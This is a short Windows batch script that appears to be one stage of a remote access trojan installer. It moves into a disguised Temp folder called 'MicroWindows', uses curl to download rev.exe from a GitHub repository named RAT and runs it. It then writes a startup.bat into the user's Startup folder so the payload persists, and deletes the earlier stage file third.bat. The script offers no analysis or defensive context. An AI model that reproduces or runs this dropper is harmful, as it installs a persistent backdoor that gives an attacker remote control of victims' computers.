@echo off
cd C:\Users\%username%\AppData\Local\Temp\MicroWindows
set "currentd=%cd%"

@rem cd "c:\Program Files\Python310\" && cd %currentd% || curl -o python-installer.exe https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe & python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
curl -o rev.exe https://raw.githubusercontent.com/saifnasef/RAT/main/rev.exe
@rem "c:\Program Files\Python310\python.exe" rev.py
rev.exe
curl -o C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat https://raw.githubusercontent.com/saifnasef/RAT/main/startup.bat
del third.bat